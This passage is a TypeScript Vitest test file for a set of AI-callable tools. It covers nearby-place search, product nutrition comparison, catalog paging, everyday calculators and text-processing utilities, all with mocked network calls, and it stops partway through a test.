import { afterEach, describe, expect, it, vi } from "vitest";
import { executeAgentTool, AGENT_TOOL_DEFINITIONS, getAgentToolDefinitions, runAgentLoop } from "../src/agent-tools";
import type { AgentToolContext } from "../src/agent-tools";
import { TOOL_CATALOG } from "../src/tools";
import type { Env } from "../src/types";

afterEach(() => vi.unstubAllGlobals());
const env = { DB: {} as never, SEARCH_JOBS: {} as never } as Env;

describe("Nolane AI callable tools", () => {
  it("exposes the catalog as a real model-callable function", () => {
    expect(AGENT_TOOL_DEFINITIONS.map(tool => tool.function.name)).toEqual([
      "list_nolane_tools", "search_web", "read_web_page", "get_weather_forecast", "check_air_quality", "convert_currency", "get_public_holidays", "find_long_weekends", "get_marine_forecast", "get_earthquake_activity", "search_books", "lookup_postal_code", "define_english_word", "search_public_domain_books", "search_museum_artworks", "search_met_open_access_artworks", "search_cleveland_museum_open_access_artworks", "search_library_of_congress_photos", "get_natural_events", "get_local_time", "search_places_in_city", "search_nearby_places", "search_steam_games", "get_steam_game_details", "search_tv_shows", "get_tv_show_episodes", "search_apple_media", "search_music_metadata", "search_scholarly_works", "search_country_profiles", "get_world_bank_indicators", "search_gbif_species", "search_gbif_observations", "search_wikimedia_images", "search_nasa_media", "lookup_food_product", "lookup_consumer_product", "compare_food_products", "search_openverse_images", "search_inaturalist_observations", "search_internet_archive_videos", "search_peertube_videos", "search_internet_archive_audio", "search_wikipedia_articles", "get_wikipedia_article", "search_wikivoyage_guides", "get_wikivoyage_guide", "lookup_wiktionary_entry", "search_meal_recipes", "filter_meal_recipes", "get_meal_recipe_details", "search_wikidata_entities", "get_wikidata_entity", "search_anime_titles", "get_anime_details", "search_manga_titles", "get_manga_details", "process_text_content", "hash_text",
    ]);
  });

  it("searches nearby places only around coordinates explicitly supplied by the user", async () => {
    const mock = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
      const url = new URL(String(input));
      expect(url.hostname).toBe("overpass-api.de");
      expect(url.pathname).toBe("/api/interpreter");
      expect(init?.method).toBe("POST");
      const body = new URLSearchParams(String(init?.body || ""));
      const query = body.get("data") || "";
      expect(query).toContain('["amenity"~"^(pharmacy)$"]');
      expect(query).toContain("around:1500,20.84490,106.68810");
      return new Response(JSON.stringify({
        elements: [
          { type: "node", id: 10, lat: 20.8450, lon: 106.6882, tags: { name: "Nhà thuốc gần", amenity: "pharmacy", website: "https://pharmacy.example" } },
          { type: "way", id: 11, center: { lat: 20.8460, lon: 106.6890 }, tags: { name: "Nhà thuốc xa", amenity: "pharmacy", website: "http://insecure.example" } },
          { type: "node", id: 12, lat: 20.8449, lon: 106.6881, tags: { amenity: "pharmacy" } }
        ],
        osm3s: { timestamp_osm_base: "2026-11-25T12:00:00Z" }
      }), { status: 200, headers: { "content-type": "application/json" } });
    });
    vi.stubGlobal("fetch", mock);

    const result = JSON.parse(await executeAgentTool(env, "search_nearby_places", {
      latitude: 20.8449, longitude: 106.6881, category: "pharmacy", radius_m: 1500, limit: 10,
    }));
    expect(result.status).toBe("ok");
    expect(result.source).toBe("OpenStreetMap Overpass API");
    expect(result.attribution).toContain("OpenStreetMap contributors");
    expect(result.places.map((place: { name: string }) => place.name)).toEqual(["Nhà thuốc gần", "Nhà thuốc xa"]);
    expect(result.places[0].website).toBe("https://pharmacy.example/");
    expect(result.places[1].website).toBeNull();
    expect(result.places[0].mapUrl).toContain("openstreetmap.org");
    expect(mock).toHaveBeenCalledTimes(1);
  });

  it("rejects guessed, malformed or excessive nearby-place inputs before network access", async () => {
    const mock = vi.fn();
    vi.stubGlobal("fetch", mock);
    await expect(executeAgentTool(env, "search_nearby_places", {
      location: "Hải Phòng", category: "pharmacy",
    })).rejects.toThrow("latitude");
    await expect(executeAgentTool(env, "search_nearby_places", {
      latitude: 20, longitude: 106, category: "all",
    })).rejects.toThrow("category");
    await expect(executeAgentTool(env, "search_nearby_places", {
      latitude: 20, longitude: 106, category: "food", radius_m: 100000,
    })).rejects.toThrow("radius_m");
    expect(mock).not.toHaveBeenCalled();
  });

  it("advertises the combined Nearby Essentials category to AI", () => {
    const nearby = AGENT_TOOL_DEFINITIONS.find(tool => tool.function.name === "search_nearby_places");
    const parameters = nearby?.function.parameters as {
      properties?: { category?: { enum?: string[] } };
    } | undefined;
    expect(parameters?.properties?.category?.enum).toContain("essentials");
  });

  it("dispatches cross-catalog lookup and nutrition comparison through the normal AI interface", async () => {
    const mock = vi.fn(async (input: RequestInfo | URL) => {
      const url = new URL(String(input));
      expect(url.pathname).toMatch(/^\/api\/v3\/product\/\d+$/);
      expect(url.searchParams.get("fields")).toContain("nutrition");
      const barcode = url.pathname.split("/").pop();
      if (barcode === "3017620422003") {
        return new Response(JSON.stringify({ status: "success", product: {
          code: barcode, product_type: "food", product_name: "Spread A",
          nutrition: { aggregated_set: { per: "100g", nutrients: {
            "energy-kcal": { value: 500 }, sugars: { value: 45 }
          } } }
        } }), { status: 200, headers: { "content-type": "application/json" } });
      }
      return new Response(JSON.stringify({ status: "success", product: {
        code: barcode, product_type: "food", product_name: "Spread B",
        nutrition: { aggregated_set: { per: "100g", nutrients: {
          "energy-kcal": { value: 400 }, sugars: { value: 20 }
        } } }
      } }), { status: 200, headers: { "content-type": "application/json" } });
    });
    vi.stubGlobal("fetch", mock);

    const lookedUp = JSON.parse(await executeAgentTool(env, "lookup_consumer_product", {
      barcode: "3017620422003", product_type: "all"
    }));
    expect(lookedUp.product.name).toBe("Spread A");

    const compared = JSON.parse(await executeAgentTool(env, "compare_food_products", {
      barcodes: ["3017620422003","5000159484695"]
    }));
    expect(compared.status).toBe("ok");
    expect(compared.comparisons.find((item: {metric:string}) => item.metric === "Energy").minimum)
      .toMatchObject({ barcode: "5000159484695", value: 400 });
    expect(mock).toHaveBeenCalledTimes(3);
  });

  it("discovers the complete catalog in bounded, non-overlapping pages", async () => {
    const first = JSON.parse(await executeAgentTool(env, "list_nolane_tools", {})) as {
      total: number; offset: number; limit: number; nextOffset: number | null;
      tools: Array<{id:string;category:string}>;
    };
    expect(first.total).toBe(TOOL_CATALOG.length);
    expect(first.total).toBe(542);
    expect(first.tools).toHaveLength(20);
    expect(first.nextOffset).toBe(20);
    expect(first.tools.every(tool => tool.category === "image")).toBe(true);

    const ids = new Set(first.tools.map(tool => tool.id));
    let offset = first.nextOffset;
    while (offset !== null) {
      const page = JSON.parse(await executeAgentTool(env, "list_nolane_tools", { offset, limit: 20 })) as {
        total: number; nextOffset: number | null; tools: Array<{id:string}>;
      };
      expect(page.total).toBe(first.total);
      for (const tool of page.tools) {
        expect(ids.has(tool.id)).toBe(false);
        ids.add(tool.id);
      }
      offset = page.nextOffset;
    }
    expect(ids.size).toBe(TOOL_CATALOG.length);
    expect(ids).toEqual(new Set(TOOL_CATALOG.map(tool => tool.id)));
    expect(ids.has("video-compress")).toBe(true);
    await expect(executeAgentTool(env, "list_nolane_tools", { offset: -1 })).rejects.toThrow("offset");
    await expect(executeAgentTool(env, "list_nolane_tools", { limit: 21 })).rejects.toThrow("page size");
  });

  it("exposes and runs all Wave 39 everyday calculators through the normal AI tool", async () => {
    const schema = AGENT_TOOL_DEFINITIONS.find(tool => tool.function.name === "process_text_content")?.function.parameters as {
      properties?: { tool_id?: { enum?: string[] } };
    };
    const ids = [
      "bill-split-calculator", "loan-payment-calculator", "date-calculator", "timezone-converter",
      "recipe-scaler", "grade-calculator", "paint-calculator", "fuel-trip-calculator",
      "discount-calculator", "unit-price-comparator",
    ];
    expect(schema.properties?.tool_id?.enum).toEqual(expect.arrayContaining(ids));
    expect(TOOL_CATALOG.filter(tool => ids.includes(tool.id) && tool.ready)).toHaveLength(10);

    const run = (tool_id: string, value: unknown) => executeAgentTool(env, "process_text_content", {
      tool_id, content: JSON.stringify(value),
    });
    expect(await run("bill-split-calculator", {bill_amount:100,tip_percent:10,tax_percent:10,people:3,currency:"USD"}))
      .toContain("Total: USD 120.00");
    expect(await run("loan-payment-calculator", {principal:1200,annual_rate_percent:0,term_months:12,currency:"USD"}))
      .toContain("Scheduled payment: USD 100.00");
    expect(await run("date-calculator", {start_date:"2026-11-20",end_date:"2026-11-23"}))
      .toContain("Elapsed days: 3");
    expect(await run("timezone-converter", {local_datetime:"2026-11-23T12:00",from_timezone:"Asia/Ho_Chi_Minh",to_timezone:"Europe/London"}))
      .toContain("Europe/London");
    expect(await run("recipe-scaler", {original_servings:2,target_servings:4,ingredients:[{name:"flour",amount:250,unit:"g"}]}))
      .toContain("500 g flour");
    expect(await run("grade-calculator", {components:[{name:"Homework",score:80,weight_percent:40}],target_overall_percent:85}))
      .toContain("Required average across remaining work: 88.33%");
    expect(await run("paint-calculator", {length_m:4,width_m:3,height_m:2.5,coats:2}))
      .toContain("Estimated paint:");
    expect(await run("fuel-trip-calculator", {distance_km:120,round_trip:true,consumption_l_per_100km:6,fuel_price_per_liter:25000,currency:"VND"}))
      .toContain("Fuel cost: VND 360000");
    expect(await run("discount-calculator", {original_price:100,discount_percent:20,extra_discount_percent:10,tax_percent:10,currency:"USD"}))
      .toContain("Final unit price: USD 79.20");
    expect(await run("unit-price-comparator", {currency:"VND",items:[
      {name:"Small",price:25000,quantity:500,unit:"g"},
      {name:"Large",price:46000,quantity:1,unit:"kg"},
    ]})).toContain("Best unit price: Large");
  });

  it("exposes and runs all Wave 41 daily-life calculators through the normal AI tool", async () => {
    const schema = AGENT_TOOL_DEFINITIONS.find(tool => tool.function.name === "process_text_content")?.function.parameters as {
      properties?: { tool_id?: { enum?: string[] } };
    };
    const ids = [
      "water-bill-calculator",
      "mobile-data-duration-calculator",
      "solar-panel-output-calculator",
      "wallpaper-roll-calculator",
      "curtain-fabric-calculator",
      "moving-box-calculator",
      "event-food-calculator",
      "fuel-economy-calculator",
      "gas-cylinder-runtime-calculator",
      "shipping-volumetric-weight-calculator",
      "storage-capacity-calculator"
    ];
    expect(schema.properties?.tool_id?.enum).toEqual(expect.arrayContaining(ids));
    expect(TOOL_CATALOG.filter(tool => ids.includes(tool.id) && tool.ready)).toHaveLength(11);
    const run = (tool_id: string, value: unknown) => executeAgentTool(env, "process_text_content", {
      tool_id, content: JSON.stringify(value),
    });
    expect(await run("water-bill-calculator", {previous_reading_m3:120.5,current_reading_m3:128.5,price_per_m3:10000,fixed_charge:5000,sewage_percent:10,currency:"VND"}))
      .toContain("Estimated bill: VND 93000");
    expect(await run("mobile-data-duration-calculator", {allowance_gb:20,used_gb:5,daily_usage_gb:1.5,reserve_percent:10,days_until_reset:10}))
      .toContain("Usable data: 13.5 GB");
    expect(await run("solar-panel-output-calculator", {panel_watts:500,panel_count:4,peak_sun_hours_per_day:4.5,system_loss_percent:20,days:30}))
      .toContain("Estimated daily energy: 7.2 kWh");
    expect(await run("wallpaper-roll-calculator", {room_perimeter_m:12,wall_height_m:2.5,roll_width_m:0.53,roll_length_m:10,pattern_repeat_cm:53,extra_rolls:1}))
      .toContain("Suggested rolls to buy: 9");
    expect(await run("curtain-fabric-calculator", {window_width_cm:200,window_height_cm:240,fabric_width_cm:140,fullness_ratio:2,side_allowance_cm:30,top_hem_cm:10,bottom_hem_cm:20,pattern_repeat_cm:40}))
      .toContain("Total fabric length: 11.2 metres");
    expect(await run("moving-box-calculator", {items_volume_m3:8,box_volume_l:60,usable_fill_percent:75,extra_boxes_percent:10}))
      .toContain("Suggested boxes: 196");
    expect(await run("event-food-calculator", {guests:25,food_grams_per_person:250,drink_ml_per_person:500,snack_grams_per_person:50,extra_percent:10}))
      .toContain("Main food: 6.88 kg");
    expect(await run("fuel-economy-calculator", {distance_km:400,fuel_litres:32,price_per_litre:25000,currency:"VND"}))
      .toContain("Average consumption: 8 L/100 km");
    expect(await run("gas-cylinder-runtime-calculator", {gas_weight_kg:12,consumption_grams_per_hour:150,reserve_percent:10,hours_per_day:3}))
      .toContain("Estimated runtime: 72 hours");
    expect(await run("shipping-volumetric-weight-calculator", {length_cm:50,width_cm:40,height_cm:30,actual_weight_kg:8,volumetric_divisor:5000}))
      .toContain("Estimated billable weight: 12 kg");
    expect(await run("storage-capacity-calculator", {capacity_gb:128,reserve_percent:10,photo_size_mb:4,video_size_mb_per_minute:150,document_size_mb:1}))
      .toContain("about 28,800 photos");
  });

  it("exposes and runs all Wave 43 home, hobby and study tools through the normal AI tool", async () => {
    const schema = AGENT_TOOL_DEFINITIONS.find(tool => tool.function.name === "process_text_content")?.function.parameters as {
      properties?: { tool_id?: { enum?: string[] } };
    };
    const ids = [
      "habit-history-analyzer", "plant-care-scheduler", "garden-bed-capacity-calculator",
      "home-inventory-report", "home-maintenance-scheduler", "pet-routine-planner",
      "event-seating-planner", "spaced-review-scheduler",
    ];
    expect(schema.properties?.tool_id?.enum).toEqual(expect.arrayContaining(ids));
    expect(TOOL_CATALOG.filter(tool => ids.includes(tool.id) && tool.ready)).toHaveLength(8);
    const run = (tool_id: string, value: unknown) => executeAgentTool(env, "process_text_content", {
      tool_id, content: JSON.stringify(value),
    });

    const habits = await run("habit-history-analyzer", {
      as_of_date:"2026-11-24",window_days:7,
      habits:[{name:"Read",target_days_per_week:5,check_ins:["2026-11-21","2026-11-22","2026-11-23","2026-11-24"]}],
    });
    expect(habits).toContain("Check-ins in window: 4 / 5 target");
    expect(habits).toContain("Target completion: 80%");
    expect(habits).toContain("Current streak: 4 day(s)");

    const plants = await run("plant-care-scheduler", {
      as_of_date:"2026-11-24",window_days:14,
      plants:[{name:"Monstera",care_tasks:[
        {task:"Water",last_done:"2026-11-20",every_days:3},
        {task:"Rotate pot",last_done:"2026-11-22",every_days:14},
      ]}],
    });
    expect(plants).toContain("2026-11-23 | Monstera | Water");
    expect(plants).toContain("OVERDUE by 1 day(s)");
    expect(plants).toContain("2026-12-06");

    const garden = await run("garden-bed-capacity-calculator", {
      beds:[{name:"Raised bed",length_m:2,width_m:1,plant_spacing_cm:30,row_spacing_cm:25}],
    });
    expect(garden).toContain("Rows: 4");
    expect(garden).toContain("Plants per row: 6");
    expect(garden).toContain("Estimated capacity: 24 plant(s)");

    const inventory = await run("home-inventory-report", {
      as_of_date:"2026-11-24",currency:"USD",
      items:[{name:"Laptop",category:"Electronics",quantity:2,purchase_price_per_item:100,
        purchase_date:"2025-11-24",warranty_months:12,expected_life_months:24,location:"Desk"}],
    });
    expect(inventory).toContain("USD 200.00");
    expect(inventory).toContain("Warranty: active; through 2026-11-24");
    expect(inventory).toContain("Expected service-life date entered by user: 2027-11-24");

    const maintenance = await run("home-maintenance-scheduler", {
      as_of_date:"2026-11-24",window_days:60,
      tasks:[{name:"Clean air filter",last_completed:"2026-10-24",every_days:30,estimated_minutes:20,priority:4}],
    });
    expect(maintenance).toContain("OVERDUE since 2026-11-23 by 1 day(s)");
    expect(maintenance).toContain("next cycle 2026-12-23");

    const pets = await run("pet-routine-planner", {
      start_date:"2026-11-24",days:4,
      pets:[{name:"Milo",routines:[
        {task:"Walk",time:"08:00",days_of_week:["Tue","Thu"],note:"Short walk"},
        {task:"Brush",time:"18:00",days_of_week:["Wed"]},
      ]}],
    });
    expect(pets).toContain("2026-11-24 (Tue)");
    expect(pets).toContain("08:00 | Milo | Walk");
    expect(pets).toContain("18:00 | Milo | Brush");

    const seating = await run("event-seating-planner", {
      tables:[{name:"Table A",seats:4},{name:"Table B",seats:2}],
      guest_groups:[
        {name:"Family",guests:["Alice","Ben"]},
        {name:"Friends",guests:["Cara","Dan"]},
        {name:"Solo",guests:["Eli"]},
      ],
      avoid_pairs:[["Alice","Cara"]],
    });
    expect(seating).toContain("Assigned guests: 5/5");
    expect(seating).toContain("Unassigned guests: 0");

    const reviews = await run("spaced-review-scheduler", {
      as_of_date:"2026-11-24",planning_days:14,
      topics:[
        {name:"Chemistry",last_reviewed:"2026-11-20",confidence:3},
        {name:"History",last_reviewed:"2026-11-01",confidence:5},
      ],
    });
    expect(reviews).toContain("Review today");
    expect(reviews).toContain("OVERDUE by 9 day(s)");
    expect(reviews).toContain("not the FSRS algorithm");
  });

  it("exposes and runs all Wave 42 personal planning tools through the normal AI tool", async () => {
    const schema = AGENT_TOOL_DEFINITIONS.find(tool => tool.function.name === "process_text_content")?.function.parameters as {
      properties?: { tool_id?: { enum?: string[] } };
    };
    const ids = [
      "meal-shopping-list-planner", "travel-packing-checklist", "study-plan-scheduler",
      "weekly-chore-planner", "subscription-cost-calculator", "commute-cost-calculator",
      "reading-plan-calculator", "grocery-budget-planner",
    ];
    expect(schema.properties?.tool_id?.enum).toEqual(expect.arrayContaining(ids));
    expect(TOOL_CATALOG.filter(tool => ids.includes(tool.id) && tool.ready)).toHaveLength(8);
    const run = (tool_id: string, value: unknown) => executeAgentTool(env, "process_text_content", {
      tool_id, content: JSON.stringify(value),
    });

    expect(await run("meal-shopping-list-planner", {meals:[
      {name:"Dinner",servings:2,target_servings:4,ingredients:[
        {name:"Rice",quantity:200,unit:"g",category:"Pantry"},
        {name:"Chicken",quantity:300,unit:"g",category:"Meat"},
      ]},
      {name:"Breakfast",servings:1,target_servings:1,ingredients:[
        {name:"rice",quantity:100,unit:"g",category:"Pantry"},
        {name:"Eggs",quantity:2,unit:"pcs",category:"Dairy"},
      ]},
    ]})).toContain("500 g Rice");

    const packing = await run("travel-packing-checklist", {
      days:5,nights:4,travelers:2,climate:"cold",activities:["hiking","business"],international:true,
    });
    expect(packing).toContain("2 × Warm layer / jacket");
    expect(packing).toContain("2 × Hiking shoes");
    expect(packing).toContain("2 × Passport / international travel document");

    const study = await run("study-plan-scheduler", {
      start_date:"2026-11-24",available_minutes_per_day:60,session_minutes:50,
      study_days:["Tue","Wed","Thu"],
      tasks:[
        {name:"Physics revision",due_date:"2026-11-26",estimated_hours:2,priority:4},
        {name:"English vocabulary",due_date:"2026-11-25",estimated_hours:0.5,priority:5},
      ],
    });
    expect(study).toContain("Scheduled study time: 150 minutes");
    expect(study).toContain("Unscheduled tasks: 0");

    const chores = await run("weekly-chore-planner", {
      people:["Alex","Sam"],
      chores:[
        {name:"Wash dishes",times_per_week:7,duration_minutes:20},
        {name:"Vacuum",times_per_week:2,duration_minutes:30,preferred_days:["Sat","Sun"]},
      ],
    });
    expect(chores).toContain("Wash dishes");
    expect(chores).toContain("Vacuum");
    expect(chores).toContain("Weekly workload by person");

    const subscriptions = await run("subscription-cost-calculator", {
      currency:"USD",
      subscriptions:[
        {name:"Music",amount:12,billing_cycle:"monthly"},
        {name:"Storage",amount:20,billing_cycle:"quarterly"},
      ],
    });
    expect(subscriptions).toContain("USD 224.00 per year");
    expect(subscriptions).toContain("USD 18.67 average per month");

    const car = await run("commute-cost-calculator", {
      mode:"car",commute_days_per_month:20,currency:"VND",
      distance_one_way_km:10,consumption_l_per_100km:6.5,fuel_price_per_litre:25000,
      parking_per_day:30000,people_sharing:2,
    });
    expect(car).toContain("Total monthly commute cost: VND 1250000");
    expect(car).toContain("Estimated monthly cost per person: VND 625000");

    const transit = await run("commute-cost-calculator", {
      mode:"public_transport",commute_days_per_month:20,currency:"EUR",
      round_trip_fare:5,monthly_pass_price:75,
    });
    expect(transit).toContain("Estimated monthly transit cost: EUR 75.00");

    const reading = await run("reading-plan-calculator", {
      pages_remaining:420,days_until_deadline:14,reading_days_per_week:5,pages_per_hour:30,
    });
    expect(reading).toContain("Reading sessions assumed: 10");
    expect(reading).toContain("Suggested pace: about 42 pages per reading day");
    expect(reading).toContain("about 84 minutes");

    const groceries = await run("grocery-budget-planner", {
      currency:"VND",budget:100000,
      items:[
        {name:"Rice",quantity:2,unit_price:30000,category:"Pantry"},
        {name:"Milk",quantity:1,unit_price:25000,category:"Dairy"},
      ],
    });
    expect(groceries).toContain("Estimated total: VND 85000");
    expect(groceries).toContain("Budget remaining: VND 15000");
  });

  it("exposes and runs all Wave 40 household and travel calculators through the normal AI tool", async () => {
    const schema = AGENT_TOOL_DEFINITIONS.find(tool => tool.function.name === "process_text_content")?.function.parameters as {
      properties?: { tool_id?: { enum?: string[] } };
    };
    const ids = [
      "appliance-energy-calculator", "floor-tile-calculator", "concrete-volume-calculator",
      "soil-mulch-calculator", "household-budget-calculator", "savings-goal-calculator",
      "travel-budget-calculator", "download-time-calculator", "work-hours-calculator",
      "battery-runtime-calculator", "water-tank-volume-calculator",
    ];
    expect(schema.properties?.tool_id?.enum).toEqual(expect.arrayContaining(ids));
    expect(TOOL_CATALOG.filter(tool => ids.includes(tool.id) && tool.ready)).toHaveLength(11);
    const run = (tool_id: string, value: unknown) => executeAgentTool(env, "process_text_content", {
      tool_id, content: JSON.stringify(value),
    });
    expect(await run("appliance-energy-calculator", {price_per_kwh:2000,currency:"VND",appliances:[{name:"Fan",watts:100,hours_per_day:5,days_per_month:30}]}))
      .toContain("Estimated monthly cost: VND 30000");
    expect(await run("floor-tile-calculator", {room_length_m:3,room_width_m:4,tile_length_cm:60,tile_width_cm:60,waste_percent:10,tiles_per_box:4,price_per_box:150000,currency:"VND"}))
      .toContain("Boxes to buy: 10 (40 tiles)");
    expect(await run("concrete-volume-calculator", {length_m:2,width_m:3,depth_m:0.15,waste_percent:10,bag_yield_l:40}))
      .toContain("Bags required: 25");
    expect(await run("soil-mulch-calculator", {area_m2:10,depth_cm:5,waste_percent:10,bag_volume_l:50}))
      .toContain("Order estimate: 550 litres");
    expect(await run("household-budget-calculator", {monthly_income:20000000,currency:"VND",expenses:[
      {name:"Rent",category:"Needs",monthly_amount:6000000},
      {name:"Food",category:"Needs",monthly_amount:4000000},
      {name:"Fun",category:"Wants",monthly_amount:2000000},
    ]})).toContain("Money remaining: VND 8000000");
    expect(await run("savings-goal-calculator", {target_amount:1000,current_savings:100,monthly_contribution:100,annual_interest_rate_percent:0,currency:"USD"}))
      .toContain("Estimated time: 9 months");
    expect(await run("travel-budget-calculator", {travelers:3,days:5,buffer_percent:10,currency:"USD",expenses:[
      {category:"Hotel",total_cost:1200},{category:"Food",total_cost:600},{category:"Transport",total_cost:300},
    ]})).toContain("Budget including buffer: USD 2310");
    expect(await run("download-time-calculator", {file_size:1,file_size_unit:"GB",speed:100,speed_unit:"Mbps",overhead_percent:10}))
      .toContain("Seconds: 88");
    expect(await run("work-hours-calculator", {hourly_rate:100000,currency:"VND",shifts:[
      {start:"09:00",end:"17:00",break_minutes:60},{start:"22:00",end:"02:00",break_minutes:15},
    ]})).toContain("Total paid hours: 10.75");
    expect(await run("battery-runtime-calculator", {capacity_mah:10000,voltage_v:3.7,device_power_w:5,efficiency_percent:80,reserve_percent:10}))
      .toContain("Usable energy estimate: 26.64 Wh");
    expect(await run("water-tank-volume-calculator", {shape:"rectangular",length_m:2,width_m:1.5,height_m:1,fill_percent:50}))
      .toContain("Water at this fill level: 1500 litres");
  });

  it("keeps technical tools available by explicit category without prioritizing them by default", async () => {
    const definition = AGENT_TOOL_DEFINITIONS.find(tool => tool.function.name === "list_nolane_tools");
    const schema = definition?.function.parameters as { properties?: { category?: { enum?: string[] }; offset?: unknown; limit?: unknown } };
    expect(schema.properties?.category && (schema.properties.category as {enum?:string[]}).enum)
      .toEqual(expect.arrayContaining(["image", "document", "audio-video", "data", "utility", "developer", "repository"]));
    expect(schema.properties?.offset).toBeDefined();
    expect(schema.properties?.limit).toBeDefined();

    const repository = JSON.parse(await executeAgentTool(env, "list_nolane_tools", { category: "repository", query: "repo-security-audit", limit: 20 })) as {tools:Array<{id:string}>};
    expect(repository.tools.some(tool => tool.id === "repo-security-audit")).toBe(true);
    const supplyChain = JSON.parse(await executeAgentTool(env, "list_nolane_tools", { category: "repository", query: "repo-supply-chain" })) as {tools:Array<{id:string}>};
    expect(supplyChain.tools.some(tool => tool.id === "repo-supply-chain")).toBe(true);
    const developer = JSON.parse(await executeAgentTool(env, "list_nolane_tools", { category: "developer", query: "code-imports", limit: 20 })) as {tools:Array<{id:string}>};
    expect(developer.tools.some(tool => tool.id === "code-imports")).toBe(true);
    const audioVideo = JSON.parse(await executeAgentTool(env, "list_nolane_tools", { category: "audio-video", query: "audio-convert", limit: 20 })) as {tools:Array<{id:string}>};
    expect(audioVideo.tools.some(tool => tool.id === "audio-convert")).toBe(true);
  });

  it("exposes file preparation only when a verified private-chat callback is supplied", async () => {
    const callback = vi.fn(async (goal: string) => "Ready for upload: " + goal);
    const context: AgentToolContext = { canPrepareFileProcessing: true, prepareFileProcessing: callback };
    expect(getAgentToolDefinitions().some(tool => tool.function.name === "prepare_file_processing")).toBe(false);
    expect(getAgentToolDefinitions(context).some(tool => tool.function.name === "prepare_file_processing")).toBe(true);
    await expect(executeAgentTool(env, "prepare_file_processing", {goal:"Extract text from this PDF"})).rejects.toThrow("authorized private");
    await expect(executeAgentTool(env, "prepare_file_processing", {goal:"Extract text from this PDF"}, {
      canPrepareFileProcessing: false, prepareFileProcessing: callback,
    })).rejects.toThrow("authorized private");
    await expect(executeAgentTool(env, "prepare_file_processing", {goal:"tiny"}, context)).rejects.toThrow("clear file-processing goal");
    await expect(executeAgentTool(env, "prepare_file_processing", {goal:"Extract text from this PDF"}, context))
      .resolves.toBe("Ready for upload: Extract text from this PDF");
    expect(callback).toHaveBeenCalledTimes(1);
    expect(callback).toHaveBeenCalledWith("Extract text from this PDF");
  });

  it("formats JSON and cleans text through bounded processor calls", async () => {
    const formatted = await executeAgentTool(env, "process_text_content", {tool_id:"json-format",content:'{"b":2,"a":1}'});
    expect(formatted).toBe("{\n  \"b\": 2,\n  \"a\": 1\n}");
    const cleaned = await executeAgentTool(env, "process_text_content", {tool_id:"text-clean",content:"Cafe\u0301  \u200b\r\n\n\nline"});
    expect(cleaned).toBe("Café\n\nline");
  });

  it("runs new everyday text, extraction, encoding and JSON utilities", async () => {
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-uppercase",content:"Xin chào"})).toBe("XIN CHÀO");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-reverse-lines",content:"first\nsecond\nthird"})).toBe("third\nsecond\nfirst");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-emails",content:"A@Example.com and a@example.com"})).toBe("A@Example.com");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"url-encode",content:"xin chào"})).toBe("xin%20ch%C3%A0o");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"url-decode",content:"xin%20ch%C3%A0o"})).toBe("xin chào");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-sort-keys",content:'{"z":1,"a":{"y":2,"b":3}}'})).toBe('{\n  "a": {\n    "b": 3,\n    "y": 2\n  },\n  "z": 1\n}');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"language-detect",content:"Xin chào, tôi là người Việt Nam"})).toContain("Vietnamese");
    const schema=AGENT_TOOL_DEFINITIONS.find(tool=>tool.function.name==="process_text_content")?.function.parameters as {properties?:Record<string,unknown>};
    expect(schema.properties?.target_language).toBeDefined();
  });

  it("runs the second wave of slug, data extraction, casing, masking and JSONL processors", async () => {
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-slugify",content:"Xin Chào Đặng\nHello World"})).toBe("xin-chao-dang\nhello-world");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-snake-case",content:"Hello World\nXML Parser"})).toBe("hello_world\nxml_parser");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-kebab-case",content:"Hello World"})).toBe("hello-world");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-camel-case",content:"Hello World"})).toBe("helloWorld");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-reverse-characters",content:"abc\nxin"})).toBe("cba\nnix");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-word-frequency",content:"One two one"})).toContain("one\t2");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-numbers",content:"x=-12, 3.14 and 3.14"})).toBe("-12\n3.14");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-dates",content:"2024-02-29 and 31/02/2024"})).toBe("2024-02-29");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-ipv4",content:"192.168.1.1 and 999.1.1.1"})).toBe("192.168.1.1");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-mask-emails",content:"Contact user@example.com"})).not.toContain("user@example.com");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-mask-phones",content:"Call 0912345678"})).not.toContain("0912345678");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-swap-case",content:"HeLLo"})).toBe("hEllO");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-remove-emoji",content:"Hello 😀 world"})).toBe("Hello  world");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-to-jsonl",content:'[{"a":1},{"b":2}]'})).toBe('{"a":1}\n{"b":2}');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"jsonl-to-json",content:'{"a":1}\n{"b":2}'})).toBe('[\n  {\n    "a": 1\n  },\n  {\n    "b": 2\n  }\n]');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-to-tsv",content:'name,note\nAn,"hello, world"'})).toBe("name\tnote\nAn\thello, world");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"tsv-to-csv",content:"name\tnote\nAn\tworld"})).toBe("name,note\nAn,world");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-to-markdown",content:"name,score\nAn,7"})).toContain("| An | 7 |");
  });

  it("runs the third wave of text cleanup, extraction, CSV and JSON helpers", async () => {
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-collapse-whitespace",content:" a   b  \n c "})).toBe("a b\nc");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-remove-punctuation",content:"hello,world! nice-day"})).toBe("hello world nice day");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-to-ascii",content:"Đặng café"})).toBe("Dang cafe");
